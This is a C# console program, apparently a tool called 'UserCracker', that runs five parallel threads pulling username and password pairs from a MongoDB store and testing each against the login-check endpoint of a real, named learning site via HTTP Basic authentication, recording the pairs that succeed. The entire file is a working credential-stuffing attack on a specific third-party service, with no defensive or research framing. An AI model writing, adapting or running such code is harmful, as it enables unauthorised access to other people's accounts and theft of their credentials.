using SweetFly.Model.Entities.UserCracker;
using SweetFly.Repository;
using SweetFly.Repository.contract;
using SweetFly.Utility;
using SweetFly.Utility.Security;
using System;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SweetFly.UserCracker
{
    internal class Program
    {
        private static readonly IUserCrackRepository repository = new MongoDbRepository();
        private static int skip = 134451;

        private static void Main(string[] args)
        {
            //repository.SavePosition(1);
            Process();
            //Crack();

            Console.ReadKey();
        }

        private async static void Process()
        {
            Task.Factory.StartNew(new Func<Task>(Crack));
            Task.Factory.StartNew(new Func<Task>(Crack));
            Task.Factory.StartNew(new Func<Task>(Crack));
            Task.Factory.StartNew(new Func<Task>(Crack));
            Task.Factory.StartNew(new Func<Task>(Crack));
        }

        private async static Task Crack()
        {
            const string url = "http://learning.cmr.com.cn/member/checkuser.asp?type=AD";
            while (true)
            {
                var skipNo = Interlocked.Increment(ref skip);
                repository.SavePosition(skipNo);
                var crackUser = await repository.GetOne(skipNo);

                try
                {
                    var baseAuth = string.Format("Basic {0}",
                        Base64Encrypt.EncryptString(crackUser.UserName + ":" + crackUser.Password));

                    var strResponse = HttpUtility.Get(url, Encoding.UTF8, x =>
                    {
                        x.Referer = "http://learning.cmr.com.cn/";
                        x.Headers["Authorization"] = baseAuth;
                    });

                    //保存
                    repository.SaveSuccessUserInfo(new CmrUserInfo()
                    {
                        UserName = crackUser.UserName,
                        Password = crackUser.Password,
                        CreateDate = DateTime.Now
                    });
                    Console.WriteLine(JsonUtility.Serialize(crackUser));
                }
                catch (WebException)
                {
                    Console.Write(".");
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
        }
    }
}